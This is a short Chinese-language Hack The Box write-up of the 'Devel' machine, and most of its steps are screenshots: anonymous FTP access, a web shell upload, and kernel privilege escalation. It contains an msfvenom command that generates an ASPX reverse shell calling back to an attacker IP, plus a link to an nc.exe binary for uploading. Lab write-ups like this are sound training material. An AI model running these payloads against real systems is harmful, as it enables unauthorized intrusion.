+++
title = '0X003 Devel'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE8fa170ba37f4fdeeebab2d8169336c34image.png)

![](/htb_img/WEBRESOURCE77147834dff16d0532bf298f0ff45314image.png)

![](/htb_img/WEBRESOURCE20d52032feda99b423deb2fa93ae93a2image.png)

# 获取立足点

ftp匿名登录:

![](/htb_img/WEBRESOURCEdda843ba7d07b35e6a5190d2007b8a8bimage.png)

HTTP配合：

![](/htb_img/WEBRESOURCE4585ba8026fe26a06f7f20ad79925988image.png)

生成木马：

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f aspx -o cxk.aspx

![](/htb_img/WEBRESOURCE93b9d30a443c1afadfd86c98d81e9888image.png)

![](/htb_img/WEBRESOURCEa5950510bcf11e167cd7053203227b51image.png)

![](/htb_img/WEBRESOURCEda8018e18f77cf2ea0a6ec577ac7757dimage.png)

# 提权

没有任何补丁：

![](/htb_img/WEBRESOURCE509e781aa6e38526e096213733c82c83image.png)

内核提权试试：

![](/htb_img/WEBRESOURCE87c9c9a4ef6e7a3b8aa0cf997a4692a3image.png)

![](/htb_img/WEBRESOURCE310b6501a12cf39328a35d979f49c2eeimage.png)

上传32位的nc:

[https://github.com/int0x33/nc.exe/blob/master/nc.exe](https://github.com/int0x33/nc.exe/blob/master/nc.exe)

![](/htb_img/WEBRESOURCEc4e3a7d776e726e569ad4208ad021cdeimage.png)

![](/htb_img/WEBRESOURCEe3ae08c61484e306d1701a528ecf7c63image.png)

6988a0c5429f9c38b48a927333d8701a

![](/htb_img/WEBRESOURCE6c35dd9d6df83c998958875edb31c3f6image.png)